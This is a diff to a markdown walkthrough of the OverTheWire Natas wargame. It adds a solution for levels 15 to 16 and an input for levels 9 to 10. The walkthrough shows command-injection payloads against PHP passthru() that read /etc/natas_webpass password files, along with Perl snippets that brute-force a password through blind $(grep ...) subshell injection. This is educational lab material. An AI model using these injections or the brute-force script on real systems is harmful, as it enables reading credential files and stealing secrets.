@@ -289,7 +289,7 @@ This page welcomes the user with a form: "Find words containing".
 - Inspect the resources.
 - Get the password.
 
-### Form 08
+### Testing form 08
 
 It appears the form returns all the words that contain the text the user typed.
 
@@ -331,7 +331,7 @@ http://natas9.natas.labs.overthewire.org/dictionary.txt
 - It appears the `passthru()` function in php is dangerous and normally should be disabled in `php.ini`.
 - The usage of `passthru()` gives the user the chance to inject php code in the `needle=` param.
 
-### PHP code injection 01
+### PHP code injection 08
 
 In a normal scenario the url looks like this:
 
@@ -399,7 +399,7 @@ Thoughts:
 - It looks like now it checks for presence of semicolon and symbols used for code injection.
 - Even though it checks for symbols, it's still using `passthru()`.
 
-### PHP code injection 02
+### PHP code injection 09
 
 After some failed attempts, turns out the regex is unavoidable. So user will have to work with the fact that `$key` will reach the `grep` as a regular string.
 
@@ -419,6 +419,12 @@ The last thing to do is to put some character that will match with the password,
 
 ```bash
 grep -i a /etc/natas_webpass/natas11 dictionary.txt
+```
+
+The input to the field would be this:
+
+```text
+a /etc/natas_webpass/natas11
 ```
 
 If it matches the user will see in the output the password, plus the matches from `dictionary.txt`.
@@ -1158,3 +1164,204 @@ Steps:
 3. Set up the looping process for testing the chars, it should run until the goal string reaches the length constraints.
 4. Test each char, injecting it into the SQL query.
 5. Check if is valid by parsing the HTML output given as response. If it is, update the string that holds the final value.
+
+## Level 15 ➡ Level 16
+
+The website is similar to the one in [Level 08 ➡ Level 09](#level-08--level-09), it has only one form field with the label "Find words containing". It also has the following message:
+
+> For security reasons, we now filter even more on certain characters.
+
+And an output title that shows results as the user submits the form. Here go the general steps to follow:
+
+- Test the form.
+- Inspect the resources.
+- Find out the vulnerability or strategy to use.
+- Get the password.
+
+### Testing form 15
+
+Basic tests:
+
+- Blank field gives nothing.
+- Regular string or char gives the list of values that contain that string in them.
+- The URL after submitting: `.../?needle=test&submit=Search`
+
+### Inspection 15
+
+The form seems to be using the same `dictionary.txt` as level 8 to 9 (or at least its own version). I can be inspected in [http://natas16.natas.labs.overthewire.org/dictionary.txt](http://natas16.natas.labs.overthewire.org/dictionary.txt).
+
+#### HTML inspection 15
+
+Nothing interesting.
+
+#### PHP inspection 15
+
+Exact same code as [Level 9 ➡ 10](#inspection-09). Except this part:
+
+```php
+<?
+if(preg_match('/[;|&`\'"]/',$key)) {
+    print "Input contains an illegal character!";
+} else {
+    passthru("grep -i \"$key\" dictionary.txt");
+}
+?>
+```
+
+In level 9 to 10 looks like this:
+
+```php
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+```
+
+Thoughts:
+
+- This time it checks for additional characters: backtick (`` ` ``), single quote (`'`) and double quote (`"`).
+- There is another way of executing a command with characters not considered: `$(whoami)`. But this runs in a subshell, so at the end of the day `grep` will count it as a string.
+
+```bash
+grep -i "$(something)" dictionary.txt
+```
+
+### Resolution 15
+
+Taking into consideration the vulnerability explained in the inspection. I can brute force the password by testing each character, like the previous level.
+
+Consider this input:
+
+```bash
+grep -i "$(cat /etc/natas_webpass/natas17)" dictionary.txt
+```
+
+The `grep` command will look for the password for natas17 in `dictionary.txt`. Of course this won't return anything. But if instead of the whole password I test for just a part of it:
+
+```bash
+grep -i "$(grep a /etc/natas_webpass/natas17)" dictionary.txt
+```
+
+Here I first search for the string 'a' in the password. If it is on the password, the final command would look like:
+
+```bash
+grep -i THE_PASSWORD dictionary.txt
+```
+
+Which won't show result in a match considering `dictionary.txt` contains regular words. If the letter 'a' is not in the password, the command would look like this:
+
+```bash
+grep -i "" dictionary.txt
+```
+
+Which will return the whole contents of `dictionary.txt`.
+
+Using this knowledge the brute force operation will test char by char and confirm it by looking at the HTML output:
+
+- If tested string is correct: **no list on the webpage**.
+- If tested is not correct: **list on the webpage**.
+
+To make things easier, instead of just sending the shell command, I can send a string I know exists on the dictionary. Here goes an example:
+
+```bash
+grep -i "example" dictionary.txt
+```
+
+The file `dictionary.txt` has this words that match:
+
+```text
+counterexample
+example
+example's
+exampled
+examples
+```
+
+Lets go back to the injection, but this time using an exact word too:
+
+```bash
+grep -i "counterexample$(grep SOME_STRING /etc/natas_webpass/natas17)" dictionary.txt
+```
+
+This time:
+
+- If the tested string is correct: **no list on the webpage**.
+- If the tested string is not correct: ***counterexample* on the webpage**.
+
+#### Bruteforcing 15
+
+To not post the whole script, I will be posting only snippets of relevant parts. Start by defining the request operation:
+
+```perl
+sub req {
+    my ($needle) = @_;
+    my $new_url = $url . "?needle=$needle&submit=Search";
+    my $response = $http->get($new_url, { headers => \%headers });
+
+    unless ($response->{success}) {
+        die "Failed: $response->{status} $response->{content}\n";
+    } 
+
+    return $response->{content};
+}
+```
+
+- Since the website handles it as a GET request with params I do the same.
+
+Taking into consideration what I said previously about the usage of the word "counterexample", the interpretation of the response will be handled by this function:
+
+```perl
+sub correct {
+    my ($candidate) = @_;
+
+    return $candidate =~ "counterexample" ? 0 : 1;
+}
+```
+
+- Where `$candidate` is an HTML response.
+
+The setup of the request parameter and execution will be handled by this function:
+
+```perl
+sub check {
+    my ($candidate) = @_;
+
+    print "Attempting password: $candidate\n";
+    my $encoded = uri_escape("counterexample\$(grep $candidate /etc/natas_webpass/natas17)");
+    
+    return req $encoded;
+}
+```
+
+- Since the value is sent via URL, the special characters like '$' have to be url-encoded.
+
+The brute forcing will be handled by this loop:
+
+```perl
+while (length $natas17_pass < 32) {
+    for my $ch (split //, $chars) {
+        my $res1 = check "$natas17_pass$ch";
+        
+        if (correct $res1) {
+            $natas17_pass = "$natas17_pass$ch";
+            print "$natas17_pass\n";
+            last;
+        }
+        
+        my $res2 = check "$ch$natas17_pass";
+        
+        if (correct $res2) {
+            $natas17_pass = "$ch$natas17_pass";
+            print "$natas17_pass\n";
+            last;
+        }
+    }
+}
+```
+
+- Is important to understand that, given how the `grep` command is being used, the `$ch` tested could be at the beginning or the end of the password. Because of that, I decided to just run the checker 2 times.
+
+## Level 16 ➡ Level 17
